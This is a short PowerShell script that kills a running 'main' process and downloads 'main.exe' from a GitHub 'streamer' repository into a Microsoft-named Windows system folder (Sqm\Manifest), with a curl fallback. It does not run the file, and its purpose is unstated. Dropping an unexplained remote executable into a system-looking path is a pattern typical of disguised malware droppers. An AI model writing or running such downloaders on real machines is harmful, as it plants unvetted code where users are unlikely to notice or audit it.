$ErrorActionPreference = "Stop"

$url = "https://github.com/mrjackff/streamer/raw/refs/heads/main/main.exe"
$outputPath = "C:\Program Files (x86)\Microsoft\Windows\Sqm\Manifest\main.exe"
$folderPath = "C:\Program Files (x86)\Microsoft\Windows\Sqm\Manifest"

# Check if main.exe is running
if (Get-Process -Name "main" -ErrorAction SilentlyContinue) {
    Write-Host "main.exe is running. Ending the task..."
    Stop-Process -Name "main" -Force
    Write-Host "Task ended."
} else {
    Write-Host "main.exe is not running."
}

# Check if the folder exists, and create it if it doesn't
if (-Not (Test-Path -Path $folderPath)) {
    Write-Host "Folder does not exist. Creating folder..."
    New-Item -ItemType Directory -Path $folderPath
}

# Check if the file already exists and delete it if it does
if (Test-Path -Path $outputPath) {
    Write-Host "File already exists. Replacing it..."
    Remove-Item -Path $outputPath -Force
}

# Download main.exe
Write-Host "Downloading main.exe..."
try {
    Invoke-WebRequest -Uri $url -OutFile $outputPath
} catch {
    Write-Host "Download with Invoke-WebRequest failed. Trying curl..."
    Start-Process curl -ArgumentList "-L", "-o", "`"$outputPath`"", "`"$url`"" -NoNewWindow -Wait
}

# Check if the download was successful
if (Test-Path -Path $outputPath) {
    Write-Host "Download completed successfully."
} else {
    Write-Host "Download failed."
}

Write-Host "Closing in 5 seconds..."
Start-Sleep -Seconds 5
